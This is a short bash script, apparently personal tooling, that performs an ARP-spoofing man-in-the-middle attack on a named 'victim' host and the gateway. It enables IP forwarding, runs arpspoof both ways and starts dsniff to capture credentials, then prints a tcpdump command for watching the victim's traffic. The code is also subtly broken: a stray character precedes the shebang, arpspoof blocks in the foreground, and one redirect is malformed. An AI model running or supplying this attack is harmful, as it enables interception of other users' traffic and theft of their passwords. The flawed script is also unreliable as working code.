s#!/usr/bin/env bash
#
# Author:       Riccardo Mollo (riccardomollo84@gmail.com)
#
# Name:	        sniff_host_traffic.sh
#
# Description:  A script that attempts to sniff the traffic of another machine
#               in the same subnet.               
#
# Usage:        ./sniff_host_traffic.sh
#
#
# --TODO--
# - ???
#
#
################################################################################


# VARIABLES --------------------------------------------------------------------

NIC="eth0"
GATEWAY_IP=192.168.0.1
VICTIM_IP=192.168.0.123


# FUNCTIONS --------------------------------------------------------------------

command_exists() {
    command -v "$1" >/dev/null 2>&1 || { echo "Command not found: $1" 1>&2 ; exit 1 ; }
}


# CHECKS -----------------------------------------------------------------------

if [[ $EUID -ne 0 ]] ; then
    echo "This script must be run as root!" 1>&2

    exit 1
fi

declare -a CMDS=(
"arpspoof"
"dsniff"
"tcpdump"
);

for CMD in ${CMDS[@]} ; do
    command_exists $CMD
done


# MAIN -------------------------------------------------------------------------

VIPN=$(host $VICTIM_IP | grep -v 'not found' | head -1 | awk '{print $NF}')
GTWN=$(host $GATEWAY_IP | grep -v 'not found' | head -1 | awk '{print $NF}')

echo "INTERFACE:  $NIC"
echo "VICTIM:     $VICTIM_IP    ($VIPN)"
echo "GATEWAY:    $GATEWAY_IP    ($GTWN)"

sysctl -w net.ipv4.ip_forward=1
arpspoof -t $VICTIM_IP $GATEWAY_IP 2&>/dev/null
arpspoof -t $GATEWAY_IP $VICTIM_IP 2&>/dev/null
dsniff -i $NIC -n

echo
echo "Run the following command in another terminal to see victim's traffic:"
echo "tcpdump -v host $VICTIM_IP and not arp"

echo
echo "Run the following commands to stop the sniffing:"
echo "killall arpspoof"
echo "killall dsniff"
echo "sysctl -w net.ipv4.ip_forward=0"
